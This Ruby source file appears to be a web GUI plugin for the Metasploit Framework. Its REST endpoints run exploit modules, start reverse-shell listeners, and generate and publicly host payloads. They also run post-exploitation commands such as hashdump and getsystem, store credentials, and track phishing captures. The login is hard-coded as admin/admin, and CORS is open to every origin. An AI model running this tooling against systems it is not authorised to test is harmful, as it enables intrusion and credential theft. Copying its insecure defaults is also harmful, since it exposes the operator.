# frozen_string_literal: true

#
# Metasploit GUI Plugin - Full Featured Version
#
# This plugin provides a complete web-based GUI for Metasploit Framework.
# It starts an embedded Sinatra web server with all REST API endpoints
# that communicate directly with the framework (no RPC needed).
#
# Features:
#   - Sessions, Modules, Console, Jobs management
#   - Payload generation and hosting
#   - Post-exploitation operations
#   - Target management
#   - Nmap scan integration
#   - Automation workflows
#   - Report generation
#   - Phishing campaigns
#   - WebSocket real-time updates
#
# Usage:
#   load msf_gui
#   load msf_gui Port=9000 Host=127.0.0.1
#   unload msf_gui
#
# Author: Metasploit GUI Project
# License: MIT
#

require 'sinatra/base'
require 'json'
require 'webrick'
require 'jwt'
require 'bcrypt'
require 'securerandom'
require 'fileutils'
require 'erb'
require 'net/http'
require 'uri'
require 'base64'
require 'rexml/document'
require 'faye/websocket'

module Msf
  class Plugin::MsfGui < Msf::Plugin

    # ============================================================================
    # Storage Class - JSON file persistence
    # ============================================================================
    class Storage
      def initialize(filename)
        @filepath = File.join(storage_path, filename)
        @mutex = Mutex.new
        ensure_directory
      end

      def storage_path
        ENV.fetch('MSF_GUI_STORAGE', '/tmp/msf_gui_ruby')
      end

      def load(default = {})
        @mutex.synchronize do
          return default unless File.exist?(@filepath)
          JSON.parse(File.read(@filepath), symbolize_names: true)
        rescue JSON::ParserError
          default
        end
      end

      def save(data)
        @mutex.synchronize do
          File.write(@filepath, JSON.pretty_generate(data))
        end
      end

      def update
        @mutex.synchronize do
          data = if File.exist?(@filepath)
                   JSON.parse(File.read(@filepath), symbolize_names: true)
                 else
                   {}
                 end
          result = yield(data)
          File.write(@filepath, JSON.pretty_generate(result))
          result
        rescue JSON::ParserError
          result = yield({})
          File.write(@filepath, JSON.pretty_generate(result))
          result
        end
      end

      private

      def ensure_directory
        FileUtils.mkdir_p(File.dirname(@filepath))
      end
    end

    # Storage instances
    module Stores
      class << self
        def targets
          @targets ||= Storage.new('targets.json')
        end

        def credentials
          @credentials ||= Storage.new('credentials.json')
        end

        def workflows
          @workflows ||= Storage.new('workflows.json')
        end

        def activity
          @activity ||= Storage.new('activity.json')
        end

        def reports
          @reports ||= Storage.new('reports.json')
        end

        def scans
          @scans ||= Storage.new('scans.json')
        end

        def hosted_payloads
          @hosted_payloads ||= Storage.new('hosted_payloads.json')
        end

        def phishing_campaigns
          @phishing_campaigns ||= Storage.new('phishing/campaigns.json')
        end

        def phishing_templates
          @phishing_templates ||= Storage.new('phishing/templates.json')
        end

        def phishing_captured
          @phishing_captured ||= Storage.new('phishing/captured.json')
        end

        def hosted_payloads_path
          path = ENV.fetch('MSF_GUI_STORAGE', '/tmp/msf_gui_ruby')
          File.join(path, 'hosted_payloads')
        end
      end
    end

    # ============================================================================
    # WebSocket Handler
    # ============================================================================
    class WebSocketHandler
      def initialize(framework)
        @framework = framework
        @clients = {}
        @session_subscriptions = {}
        @mutex = Mutex.new
        start_session_monitor
      end

      def call(env)
        return nil unless Faye::WebSocket.websocket?(env)

        ws = Faye::WebSocket.new(env, nil, ping: 25)
        client_id = SecureRandom.uuid

        ws.on :open do |_event|
          @mutex.synchronize { @clients[client_id] = ws }
          send_event(ws, 'connect', { sid: client_id })
        end

        ws.on :message do |event|
          handle_message(client_id, ws, event.data)
        end

        ws.on :close do |_event|
          @mutex.synchronize do
            @clients.delete(client_id)
            @session_subscriptions.delete(client_id)
          end
        end

        ws.rack_response
      end

      def broadcast(event, data)
        @mutex.synchronize do
          @clients.each_value { |ws| send_event(ws, event, data) }
        end
      end

      private

      def handle_message(client_id, ws, data)
        message = JSON.parse(data, symbolize_names: true) rescue nil
        return unless message

        event = message[:event]
        payload = message[:data] || {}

        case event
        when 'subscribe_sessions'
          @mutex.synchronize { @session_subscriptions[client_id] = ws }
          sessions = @framework.sessions.map { |id, s| session_to_hash(id, s) }
          send_event(ws, 'sessions_update', sessions)
        when 'ping'
          send_event(ws, 'pong', {})
        end
      rescue StandardError => e
        send_event(ws, 'error', { message: e.message })
      end

      def send_event(ws, event, data)
        ws.send(JSON.generate({ event: event, data: data }))
      rescue StandardError
        nil
      end

      def session_to_hash(id, session)
        {
          id: id,
          type: session.type,
          info: session.info,
          tunnel_local: session.tunnel_local,
          tunnel_peer: session.tunnel_peer,
          via_exploit: session.via_exploit,
          via_payload: session.via_payload,
          platform: session.platform,
          arch: session.arch
        }
      end

      def start_session_monitor
        Thread.new do
          previous_ids = []
          loop do
            current_ids = @framework.sessions.keys

            # Detect new sessions
            (current_ids - previous_ids).each do |id|
              session = @framework.sessions[id]
              broadcast('session_opened', session_to_hash(id, session)) if session
            end

            # Detect closed sessions
            (previous_ids - current_ids).each do |id|
              broadcast('session_closed', { session_id: id })
            end

            # Send updates to subscribers
            if current_ids != previous_ids
              sessions = @framework.sessions.map { |id, s| session_to_hash(id, s) }
              @mutex.synchronize do
                @session_subscriptions.each_value { |ws| send_event(ws, 'sessions_update', sessions) }
              end
            end

            previous_ids = current_ids
            sleep 2
          rescue StandardError
            sleep 5
          end
        end
      end
    end

    # ============================================================================
    # Main Web Application
    # ============================================================================
    class MsfGuiWebApp < Sinatra::Base
      # Class-level storage for framework and websocket handler
      class << self
        attr_accessor :msf_framework, :ws_handler
      end

      configure do
        set :server, :webrick
        set :logging, true
        set :show_exceptions, false
        set :raise_errors, false
        set :environment, :production
        disable :static
      end

      def framework
        self.class.msf_framework
      end

      def ws_handler
        self.class.ws_handler
      end

      # JWT Configuration
      SECRET_KEY = ENV.fetch('MSF_GUI_SECRET', SecureRandom.hex(32))
      ALGORITHM = 'HS256'
      TOKEN_EXPIRE = 86_400

      # Default users - store hash as string
      USERS = {
        'admin' => '$2a$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4.qwTvsgqVivBNye' # 'admin'
      }.freeze

      # CORS headers
      before do
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        # Handle CORS preflight - must halt here before auth filter runs
        halt 200 if request.request_method == 'OPTIONS'
      end

      options '*' do
        200
      end

      # ==================== Helpers ====================

      def authenticate!
        return if excluded_path?

        token = extract_token
        halt 401, json_error('Missing authentication token') unless token

        payload = decode_token(token)
        halt 401, json_error('Invalid token') if payload[:error]

        @current_user = payload['sub']
      end

      def excluded_path?
        excluded = ['/api/v1/auth/token', '/health', '/', '/api/v1/modules/stats']
        excluded.include?(request.path) ||
          request.path.start_with?('/dl/') ||
          request.path.start_with?('/api/v1/phishing/track/') ||
          request.path.start_with?('/api/v1/phishing/capture/') ||
          request.path.start_with?('/api/v1/payloads/download/')
      end

      def extract_token
        auth = request.env['HTTP_AUTHORIZATION']
        return nil unless auth

        scheme, token = auth.split(' ', 2)
        return nil unless scheme&.downcase == 'bearer'

        token
      end

      def decode_token(token)
        JWT.decode(token, SECRET_KEY, true, algorithm: ALGORITHM)[0]
      rescue JWT::ExpiredSignature
        { error: 'Token expired' }
      rescue JWT::DecodeError
        { error: 'Invalid token' }
      end

      def json_response(data, status_code: 200)
        content_type :json
        status status_code
        JSON.generate(data)
      end

      def json_error(message, status_code: 400)
        content_type :json
        halt status_code, JSON.generate({ error: true, message: message })
      end

      def parse_body
        return {} unless request.content_type&.include?('application/json')

        body = request.body.read
        request.body.rewind
        return {} if body.empty?

        JSON.parse(body, symbolize_names: true)
      rescue JSON::ParserError
        {}
      end

      before '/api/*' do
        authenticate!
        content_type :json
      end

      # ==================== WebSocket ====================

      get '/socket.io' do
        if Faye::WebSocket.websocket?(request.env)
          ws_handler.call(request.env)
        else
          json_error('WebSocket connection required', status_code: 400)
        end
      end

      # ==================== Root & Health ====================

      get '/' do
        json_response({
          name: 'Metasploit GUI',
          version: '1.0.0',
          backend: 'ruby-plugin',
          msf_version: framework.version
        })
      end

      get '/health' do
        modules_count = {
          exploit: framework.exploits.length,
          auxiliary: framework.auxiliary.length,
          post: framework.post.length,
          payload: framework.payloads.length,
          encoder: framework.encoders.length,
          nop: framework.nops.length
        }

        json_response({
          status: 'ok',
          timestamp: Time.now.iso8601,
          msf: { connected: true, version: framework.version, modules: modules_count }
        })
      end

      # ==================== Authentication ====================

      post '/api/v1/auth/token' do
        # Try multiple ways to get credentials
        username = nil
        password = nil

        # Try form data first
        if params['username'] && params['password']
          username = params['username']
          password = params['password']
        end

        # Try JSON body
        if username.nil? || password.nil?
          begin
            body_content = request.body.read
            request.body.rewind
            if body_content && !body_content.empty?
              parsed = JSON.parse(body_content, symbolize_names: true)
              username ||= parsed[:username] || parsed['username']
              password ||= parsed[:password] || parsed['password']
            end
          rescue JSON::ParserError
            # Ignore parse errors
          end
        end

        # Validate
        if username.nil? || username.to_s.empty? || password.nil? || password.to_s.empty?
          content_type :json
          halt 400, JSON.generate({ error: true, message: 'Username and password required' })
        end

        # Simple auth check - admin/admin
        unless username == 'admin' && password == 'admin'
          content_type :json
          halt 401, JSON.generate({ error: true, message: 'Invalid credentials' })
        end

        payload = { sub: username, exp: Time.now.to_i + TOKEN_EXPIRE, iat: Time.now.to_i }
        token = JWT.encode(payload, SECRET_KEY, ALGORITHM)

        json_response({ access_token: token, token_type: 'bearer', expires_in: TOKEN_EXPIRE })
      end

      get '/api/v1/auth/me' do
        json_response({ username: @current_user })
      end

      # ==================== Sessions ====================

      get '/api/v1/sessions' do
        sessions = framework.sessions.map do |id, session|
          {
            id: id, type: session.type, info: session.info,
            tunnel_local: session.tunnel_local, tunnel_peer: session.tunnel_peer,
            via_exploit: session.via_exploit, via_payload: session.via_payload,
            platform: session.platform, arch: session.arch
          }
        end
        json_response({ sessions: sessions, count: sessions.length })
      end

      get '/api/v1/sessions/:id' do
        session = framework.sessions[params[:id].to_i]
        halt 404, json_error('Session not found') unless session

        json_response({
          id: params[:id].to_i, type: session.type, info: session.info,
          tunnel_local: session.tunnel_local, tunnel_peer: session.tunnel_peer,
          via_exploit: session.via_exploit, via_payload: session.via_payload,
          platform: session.platform, arch: session.arch
        })
      end

      post '/api/v1/sessions/:id/shell/write' do
        session = framework.sessions[params[:id].to_i]
        halt 404, json_error('Session not found') unless session

        body = parse_body
        command = body[:command]
        halt 422, json_error('Command required') unless command

        session.shell_write("#{command}\n")
        json_response({ success: true })
      end

      get '/api/v1/sessions/:id/shell/read' do
        session = framework.sessions[params[:id].to_i]
        halt 404, json_error('Session not found') unless session

        output = session.shell_read(-1, 0.5) rescue ''
        json_response({ data: output })
      end

      post '/api/v1/sessions/:id/meterpreter/write' do
        session = framework.sessions[params[:id].to_i]
        halt 404, json_error('Session not found') unless session

        body = parse_body
        command = body[:command]
        halt 422, json_error('Command required') unless command

        session.run_cmd(command)
        json_response({ success: true })
      end

      get '/api/v1/sessions/:id/meterpreter/read' do
        session = framework.sessions[params[:id].to_i]
        halt 404, json_error('Session not found') unless session

        # Meterpreter doesn't have a separate read buffer like shell
        json_response({ data: '' })
      end

      post '/api/v1/sessions/:id/meterpreter/run' do
        session = framework.sessions[params[:id].to_i]
        halt 404, json_error('Session not found') unless session
        halt 400, json_error('Not a meterpreter session') unless session.type == 'meterpreter'

        body = parse_body
        command = body[:command]
        halt 422, json_error('Command required') unless command

        output = session.run_cmd(command)
        json_response({ data: output })
      end

      delete '/api/v1/sessions/:id' do
        session = framework.sessions[params[:id].to_i]
        halt 404, json_error('Session not found') unless session

        session.kill
        json_response({ success: true, message: 'Session terminated' })
      end

      # ==================== Modules ====================

      get '/api/v1/modules/types' do
        json_response(%w[exploit payload auxiliary post encoder nop evasion])
      end

      get '/api/v1/modules/stats' do
        json_response({
          exploits: framework.exploits.length,
          auxiliaries: framework.auxiliary.length,
          post: framework.post.length,
          payloads: framework.payloads.length,
          encoders: framework.encoders.length,
          nops: framework.nops.length
        })
      end

      get '/api/v1/modules/search' do
        query = params[:query] || params[:q] || ''
        type_filter = params[:type]

        halt 422, json_error('Query required') if query.empty?

        results = framework.modules.search(query)
        results = results.select { |m| m[0] == type_filter } if type_filter && !type_filter.empty?

        modules = results.map do |mod|
          { type: mod[0], name: mod[1], fullname: "#{mod[0]}/#{mod[1]}", rank: mod[2], description: mod[3] }
        end

        json_response(modules)
      end

      get '/api/v1/modules/:type' do
        type = params[:type]
        offset = (params[:offset] || 0).to_i
        limit = (params[:limit] || 100).to_i
        search = params[:search]

        modules = case type
                  when 'exploit' then framework.exploits.keys
                  when 'auxiliary' then framework.auxiliary.keys
                  when 'post' then framework.post.keys
                  when 'payload' then framework.payloads.keys
                  when 'encoder' then framework.encoders.keys
                  when 'nop' then framework.nops.keys
                  when 'evasion' then framework.evasion.keys rescue []
                  else halt 400, json_error('Invalid module type')
                  end

        if search && !search.empty?
          search_lower = search.downcase
          modules = modules.select { |m| m.downcase.include?(search_lower) }
        end

        total = modules.size
        modules = modules[offset, limit] || []

        json_response({ modules: modules, total: total, offset: offset, limit: limit })
      end

      get '/api/v1/modules/:type/*/info' do
        type = params[:type]
        name = params[:splat].join('/')

        mod = framework.modules.create("#{type}/#{name}")
        halt 404, json_error('Module not found') unless mod

        json_response({
          name: mod.name, fullname: mod.fullname, type: type,
          rank: mod.rank, description: mod.description,
          author: mod.author, license: mod.license,
          references: mod.references.map(&:to_s),
          options: mod.options.map { |k, v| { name: k, required: v.required, default: v.default, desc: v.desc } },
          platform: mod.platform.to_s, arch: mod.arch.to_s
        })
      end

      get '/api/v1/modules/:type/*/payloads' do
        name = params[:splat].join('/')

        mod = framework.modules.create("exploit/#{name}")
        halt 404, json_error('Module not found') unless mod

        payloads = mod.compatible_payloads.map { |p| p[0] }
        json_response(payloads)
      end

      post '/api/v1/modules/:type/*/execute' do
        type = params[:type]
        name = params[:splat].join('/')
        body = parse_body
        options = body[:options] || {}

        mod = framework.modules.create("#{type}/#{name}")
        halt 404, json_error('Module not found') unless mod

        options.each { |key, value| mod.datastore[key.to_s] = value.to_s }

        if type == 'exploit' && body[:payload]
          mod.datastore['PAYLOAD'] = body[:payload]
          (body[:payload_options] || {}).each { |key, value| mod.datastore[key.to_s] = value.to_s }
        end

        result = case type
                 when 'exploit'
                   mod.exploit_simple('Payload' => mod.datastore['PAYLOAD'], 'LocalInput' => nil, 'LocalOutput' => nil, 'RunAsJob' => true)
                 when 'auxiliary'
                   mod.run_simple('LocalInput' => nil, 'LocalOutput' => nil, 'RunAsJob' => true)
                 when 'post'
                   mod.run_simple('LocalInput' => nil, 'LocalOutput' => nil, 'RunAsJob' => true)
                 else
                   halt 400, json_error('Cannot execute this module type')
                 end

        json_response({ success: true, job_id: result, message: "#{type.capitalize} module started" })
      rescue StandardError => e
        json_error("Execution failed: #{e.message}", status_code: 500)
      end

      get '/api/v1/modules/jobs' do
        jobs = framework.jobs.map { |id, job| { id: id, name: job.name, start_time: job.start_time.to_s } }
        json_response(jobs)
      end

      get '/api/v1/modules/jobs/:job_id' do
        job = framework.jobs[params[:job_id].to_i]
        halt 404, json_error('Job not found') unless job

        json_response({ id: params[:job_id], name: job.name, start_time: job.start_time.to_s })
      end

      delete '/api/v1/modules/jobs/:job_id' do
        framework.jobs.stop_job(params[:job_id].to_i)
        json_response({ success: true, message: 'Job stopped' })
      end

      # ==================== Console ====================

      get '/api/v1/console' do
        consoles = []
        framework.consoles.each do |id, console|
          consoles << { id: id, prompt: console.prompt, busy: console.busy }
        end
        json_response(consoles)
      end

      post '/api/v1/console' do
        console = framework.consoles.create
        json_response({ id: console.id, prompt: console.prompt }, status_code: 201)
      end

      get '/api/v1/console/:id' do
        console = framework.consoles[params[:id].to_i]
        halt 404, json_error('Console not found') unless console

        output = console.read
        json_response({ data: output, prompt: console.prompt, busy: console.busy })
      end

      post '/api/v1/console/:id' do
        console = framework.consoles[params[:id].to_i]
        halt 404, json_error('Console not found') unless console

        body = parse_body
        command = body[:command]
        halt 422, json_error('Command required') unless command

        console.write("#{command}\n")
        json_response({ success: true })
      end

      delete '/api/v1/console/:id' do
        framework.consoles.destroy(params[:id].to_i)
        json_response({ success: true, message: 'Console destroyed' })
      end

      # ==================== Listeners ====================

      get '/api/v1/listeners/jobs' do
        jobs = framework.jobs.map { |id, job| { id: id, name: job.name, start_time: job.start_time.to_s } }
        json_response({ jobs: jobs, count: jobs.length })
      end

      get '/api/v1/listeners/jobs/:job_id' do
        job = framework.jobs[params[:job_id].to_i]
        halt 404, json_error('Job not found') unless job

        json_response({ id: params[:job_id], name: job.name, start_time: job.start_time.to_s })
      end

      delete '/api/v1/listeners/jobs/:job_id' do
        framework.jobs.stop_job(params[:job_id].to_i)
        json_response({ success: true, message: 'Job stopped' })
      end

      post '/api/v1/listeners/handler' do
        body = parse_body
        payload = body[:payload]
        lhost = body[:lhost] || body[:LHOST]
        lport = body[:lport] || body[:LPORT] || 4444

        halt 422, json_error('Payload required') unless payload
        halt 422, json_error('LHOST required') unless lhost

        handler = framework.modules.create('exploit/multi/handler')
        handler.datastore['PAYLOAD'] = payload
        handler.datastore['LHOST'] = lhost
        handler.datastore['LPORT'] = lport.to_s
        handler.datastore['ExitOnSession'] = false

        result = handler.exploit_simple('Payload' => payload, 'LocalInput' => nil, 'LocalOutput' => nil, 'RunAsJob' => true)

        json_response({ success: true, job_id: result, payload: payload, lhost: lhost, lport: lport }, status_code: 201)
      end

      get '/api/v1/listeners/payloads' do
        payloads = [
          { name: 'Windows Meterpreter Reverse TCP', payload: 'windows/meterpreter/reverse_tcp', platform: 'windows' },
          { name: 'Windows Meterpreter Reverse HTTPS', payload: 'windows/meterpreter/reverse_https', platform: 'windows' },
          { name: 'Windows x64 Meterpreter Reverse TCP', payload: 'windows/x64/meterpreter/reverse_tcp', platform: 'windows' },
          { name: 'Linux Meterpreter Reverse TCP', payload: 'linux/x64/meterpreter/reverse_tcp', platform: 'linux' },
          { name: 'Android Meterpreter Reverse TCP', payload: 'android/meterpreter/reverse_tcp', platform: 'android' },
          { name: 'macOS Meterpreter Reverse TCP', payload: 'osx/x64/meterpreter/reverse_tcp', platform: 'macos' },
          { name: 'PHP Meterpreter Reverse TCP', payload: 'php/meterpreter/reverse_tcp', platform: 'php' },
          { name: 'Python Meterpreter Reverse TCP', payload: 'python/meterpreter/reverse_tcp', platform: 'python' }
        ]
        json_response(payloads)
      end

      # ==================== Payloads ====================

      get '/api/v1/payloads/formats' do
        json_response({
          executable: %w[exe dll msi elf apk macho],
          transform: %w[hex c csharp python powershell bash base64 raw],
          web: %w[asp aspx jsp war php vba vbs hta]
        })
      end

      get '/api/v1/payloads/encoders' do
        encoders = framework.encoders.keys.map do |name|
          mod = framework.encoders.create(name) rescue nil
          { name: name, description: mod&.description, rank: mod&.rank }
        end
        json_response(encoders)
      end

      get '/api/v1/payloads/templates' do
        templates = [
          { name: 'Windows Meterpreter Reverse TCP', payload: 'windows/meterpreter/reverse_tcp', format: 'exe', platform: 'windows', options: { 'LHOST' => '', 'LPORT' => '4444' } },
          { name: 'Linux Meterpreter Reverse TCP', payload: 'linux/x64/meterpreter/reverse_tcp', format: 'elf', platform: 'linux', options: { 'LHOST' => '', 'LPORT' => '4444' } },
          { name: 'Android Meterpreter Reverse TCP', payload: 'android/meterpreter/reverse_tcp', format: 'apk', platform: 'android', options: { 'LHOST' => '', 'LPORT' => '4444' } },
          { name: 'macOS Meterpreter Reverse TCP', payload: 'osx/x64/meterpreter/reverse_tcp', format: 'macho', platform: 'macos', options: { 'LHOST' => '', 'LPORT' => '4444' } },
          { name: 'PHP Meterpreter Reverse TCP', payload: 'php/meterpreter/reverse_tcp', format: 'raw', platform: 'php', options: { 'LHOST' => '', 'LPORT' => '4444' } }
        ]
        json_response(templates)
      end

      post '/api/v1/payloads/generate' do
        body = parse_body
        payload_name = body[:payload]
        options = body[:options] || {}
        format = body[:format] || 'raw'
        encoder = body[:encoder]
        iterations = body[:iterations] || 1

        halt 422, json_error('Payload required') unless payload_name

        cmd = ['msfvenom', '-p', payload_name]
        options.each { |k, v| cmd << "#{k}=#{v}" }
        cmd += ['-f', format] unless payload_name.include?('android') && format == 'apk'
        cmd += ['-e', encoder, '-i', iterations.to_s] if encoder && !encoder.empty?

        require 'open3'
        stdout, stderr, status = Open3.capture3(*cmd)

        halt 500, json_error("Generation failed: #{stderr}") unless status.success?

        content_type 'application/octet-stream'
        headers['Content-Disposition'] = "attachment; filename=\"payload.#{format}\""
        stdout
      end

      post '/api/v1/payloads/host' do
        body = parse_body
        payload_name = body[:payload]
        options = body[:options] || {}
        format = body[:format] || 'raw'
        encoder = body[:encoder]
        iterations = body[:iterations] || 1
        custom_path = body[:path]
        expiry_hours = body[:expiry_hours] || 24

        halt 422, json_error('Payload required') unless payload_name

        cmd = ['msfvenom', '-p', payload_name]
        options.each { |k, v| cmd << "#{k}=#{v}" }
        cmd += ['-f', format] unless payload_name.include?('android') && format == 'apk'
        cmd += ['-e', encoder, '-i', iterations.to_s] if encoder && !encoder.empty?

        require 'open3'
        stdout, stderr, status = Open3.capture3(*cmd)

        halt 500, json_error("Generation failed: #{stderr}") unless status.success?

        payload_id = SecureRandom.uuid
        ext = format == 'raw' ? 'bin' : format
        filename = "#{payload_id}.#{ext}"
        url_path = custom_path || payload_id

        FileUtils.mkdir_p(Stores.hosted_payloads_path)
        filepath = File.join(Stores.hosted_payloads_path, filename)
        File.binwrite(filepath, stdout)

        payload_info = {
          id: payload_id, payload: payload_name, format: format, filename: filename,
          path: url_path, size: stdout.bytesize, created_at: Time.now.iso8601,
          expires_at: (Time.now + expiry_hours * 3600).iso8601, downloads: 0, options: options
        }

        Stores.hosted_payloads.update { |p| p[payload_id] = payload_info; p }

        host = request.host
        port = request.port
        scheme = request.scheme
        download_url = "#{scheme}://#{host}:#{port}/dl/#{url_path}"

        json_response({ id: payload_id, url: download_url, filename: filename, size: stdout.bytesize, expires_at: payload_info[:expires_at] }, status_code: 201)
      end

      get '/api/v1/payloads/hosted' do
        payloads = Stores.hosted_payloads.load({})
        now = Time.now
        active = payloads.values.select { |p| Time.parse(p[:expires_at] || p['expires_at']) > now }
        json_response(active)
      end

      delete '/api/v1/payloads/hosted/:payload_id' do
        payload_id = params[:payload_id]
        payloads = Stores.hosted_payloads.load({})
        payload = payloads[payload_id] || payloads[payload_id.to_sym]

        halt 404, json_error('Payload not found') unless payload

        filename = payload[:filename] || payload['filename']
        filepath = File.join(Stores.hosted_payloads_path, filename)
        FileUtils.rm_f(filepath)

        Stores.hosted_payloads.update { |p| p.delete(payload_id); p.delete(payload_id.to_sym); p }

        json_response({ success: true, message: 'Payload deleted' })
      end

      # Payload download (public)
      get '/dl/*' do
        path = params[:splat].first
        payloads = Stores.hosted_payloads.load({})

        payload = payloads.values.find { |p| (p[:path] || p['path']) == path || (p[:id] || p['id']) == path }
        halt 404, 'Not found' unless payload

        expires = Time.parse(payload[:expires_at] || payload['expires_at'])
        halt 410, 'Payload expired' if Time.now > expires

        payload_id = payload[:id] || payload['id']
        Stores.hosted_payloads.update do |p|
          key = p[payload_id] ? payload_id : payload_id.to_sym
          p[key][:downloads] = (p[key][:downloads] || 0) + 1 if p[key]
          p
        end

        filename = payload[:filename] || payload['filename']
        filepath = File.join(Stores.hosted_payloads_path, filename)
        halt 404, 'File not found' unless File.exist?(filepath)

        send_file filepath, filename: filename, type: 'application/octet-stream'
      end

      # ==================== Post-Exploitation ====================

      get '/api/v1/postex/modules' do
        platform = params[:platform]
        search = params[:search]

        modules = framework.post.keys

        modules = modules.select { |m| m.include?(platform.downcase) } if platform && !platform.empty?
        modules = modules.select { |m| m.downcase.include?(search.downcase) } if search && !search.empty?

        json_response({ modules: modules, total: modules.size })
      end

      post '/api/v1/postex/modules/run' do
        body = parse_body
        module_name = body[:module]
        session_id = body[:session_id]
        options = body[:options] || {}

        halt 422, json_error('Module name required') unless module_name
        halt 422, json_error('Session ID required') unless session_id

        mod = framework.modules.create("post/#{module_name}")
        halt 404, json_error('Module not found') unless mod

        mod.datastore['SESSION'] = session_id.to_s
        options.each { |k, v| mod.datastore[k.to_s] = v.to_s }

        result = mod.run_simple('LocalInput' => nil, 'LocalOutput' => nil, 'RunAsJob' => true)

        json_response({ success: true, job_id: result })
      end

      get '/api/v1/postex/credentials' do
        creds = Stores.credentials.load({ credentials: [] })
        json_response(creds[:credentials] || creds['credentials'] || [])
      end

      post '/api/v1/postex/credentials' do
        body = parse_body

        cred = {
          id: SecureRandom.uuid,
          username: body[:username], password: body[:password], hash: body[:hash],
          realm: body[:realm], host: body[:host], service: body[:service],
          port: body[:port], source: body[:source] || 'manual', created_at: Time.now.iso8601
        }

        Stores.credentials.update { |data| data[:credentials] ||= []; data[:credentials] << cred; data }

        json_response(cred, status_code: 201)
      end

      delete '/api/v1/postex/credentials/:cred_id' do
        cred_id = params[:cred_id]
        Stores.credentials.update { |data| data[:credentials]&.reject! { |c| (c[:id] || c['id']) == cred_id }; data }
        json_response({ success: true, message: 'Credential deleted' })
      end

      get '/api/v1/postex/sessions/:session_id/sysinfo' do
        session = framework.sessions[params[:session_id].to_i]
        halt 404, json_error('Session not found') unless session
        halt 400, json_error('Not a meterpreter session') unless session.type == 'meterpreter'

        output = session.run_cmd('sysinfo')
        json_response({ data: output })
      end

      get '/api/v1/postex/sessions/:session_id/getuid' do
        session = framework.sessions[params[:session_id].to_i]
        halt 404, json_error('Session not found') unless session

        output = session.type == 'meterpreter' ? session.run_cmd('getuid') : session.shell_command('whoami')
        json_response({ data: output })
      end

      post '/api/v1/postex/sessions/:session_id/getsystem' do
        session = framework.sessions[params[:session_id].to_i]
        halt 404, json_error('Session not found') unless session
        halt 400, json_error('Not a meterpreter session') unless session.type == 'meterpreter'

        output = session.run_cmd('getsystem')
        json_response({ data: output })
      end

      post '/api/v1/postex/sessions/:session_id/hashdump' do
        session = framework.sessions[params[:session_id].to_i]
        halt 404, json_error('Session not found') unless session
        halt 400, json_error('Not a meterpreter session') unless session.type == 'meterpreter'

        output = session.run_cmd('hashdump')
        json_response({ data: output })
      end

      get '/api/v1/postex/sessions/:session_id/processes' do
        session = framework.sessions[params[:session_id].to_i]
        halt 404, json_error('Session not found') unless session
        halt 400, json_error('Not a meterpreter session') unless session.type == 'meterpreter'

        output = session.run_cmd('ps')
        json_response({ data: output })
      end

      post '/api/v1/postex/sessions/:session_id/screenshot' do
        session = framework.sessions[params[:session_id].to_i]
        halt 404, json_error('Session not found') unless session
        halt 400, json_error('Not a meterpreter session') unless session.type == 'meterpreter'

        output = session.run_cmd('screenshot')
        json_response({ data: output })
      end

      # ==================== Targets ====================

      get '/api/v1/targets' do
        data = Stores.targets.load({ targets: [] })
        targets = data[:targets] || data['targets'] || []

        status_filter = params[:status]
        group_filter = params[:group]

        targets = targets.select { |t| (t[:status] || t['status']) == status_filter } if status_filter && !status_filter.empty?
        targets = targets.select { |t| (t[:group] || t['group']) == group_filter } if group_filter && !group_filter.empty?

        json_response(targets)
      end

      post '/api/v1/targets' do
        body = parse_body

        target = {
          id: SecureRandom.uuid, ip: body[:ip], hostname: body[:hostname],
          os: body[:os], os_family: body[:os_family], arch: body[:arch],
          status: body[:status] || 'unknown', tags: body[:tags] || [],
          notes: body[:notes], group: body[:group], services: [],
          session_count: 0, created_at: Time.now.iso8601, updated_at: Time.now.iso8601
        }

        halt 422, json_error('IP or hostname required') unless target[:ip] || target[:hostname]

        Stores.targets.update { |data| data[:targets] ||= []; data[:targets] << target; data }

        json_response(target, status_code: 201)
      end

      get '/api/v1/targets/:target_id' do
        data = Stores.targets.load({ targets: [] })
        targets = data[:targets] || data['targets'] || []
        target = targets.find { |t| (t[:id] || t['id']) == params[:target_id] }

        halt 404, json_error('Target not found') unless target

        json_response(target)
      end

      put '/api/v1/targets/:target_id' do
        body = parse_body
        target_id = params[:target_id]

        updated = nil
        Stores.targets.update do |data|
          data[:targets] ||= []
          idx = data[:targets].find_index { |t| (t[:id] || t['id']) == target_id }
          halt 404, json_error('Target not found') unless idx

          %i[ip hostname os os_family arch status tags notes group].each do |field|
            data[:targets][idx][field] = body[field] if body[field]
          end
          data[:targets][idx][:updated_at] = Time.now.iso8601
          updated = data[:targets][idx]
          data
        end

        json_response(updated)
      end

      delete '/api/v1/targets/:target_id' do
        target_id = params[:target_id]
        Stores.targets.update { |data| data[:targets]&.reject! { |t| (t[:id] || t['id']) == target_id }; data }
        json_response({ success: true, message: 'Target deleted' })
      end

      post '/api/v1/targets/import' do
        body = parse_body
        targets_data = body[:targets] || []

        imported = []
        Stores.targets.update do |data|
          data[:targets] ||= []
          targets_data.each do |t|
            target = {
              id: SecureRandom.uuid, ip: t[:ip], hostname: t[:hostname],
              os: t[:os], os_family: t[:os_family], arch: t[:arch],
              status: t[:status] || 'unknown', tags: t[:tags] || [],
              services: t[:services] || [], session_count: 0,
              created_at: Time.now.iso8601, updated_at: Time.now.iso8601
            }
            next unless target[:ip] || target[:hostname]
            data[:targets] << target
            imported << target
          end
          data
        end

        json_response({ success: true, imported: imported.size, targets: imported })
      end

      get '/api/v1/targets/stats/summary' do
        data = Stores.targets.load({ targets: [] })
        targets = data[:targets] || data['targets'] || []

        json_response({
          total: targets.size,
          by_status: targets.group_by { |t| t[:status] || t['status'] || 'unknown' }.transform_values(&:size),
          by_os: targets.group_by { |t| t[:os_family] || t['os_family'] || 'unknown' }.transform_values(&:size)
        })
      end

      # ==================== Nmap ====================

      get '/api/v1/nmap/profiles' do
        profiles = [
          { id: 'quick', name: 'Quick Scan', args: '-T4 -F' },
          { id: 'full', name: 'Full Scan', args: '-T4 -p- -sV -sC' },
          { id: 'stealth', name: 'Stealth Scan', args: '-sS -T2' },
          { id: 'udp', name: 'UDP Scan', args: '-sU --top-ports 100' },
          { id: 'vuln', name: 'Vulnerability Scan', args: '-sV --script vuln' },
          { id: 'discovery', name: 'Host Discovery', args: '-sn' },
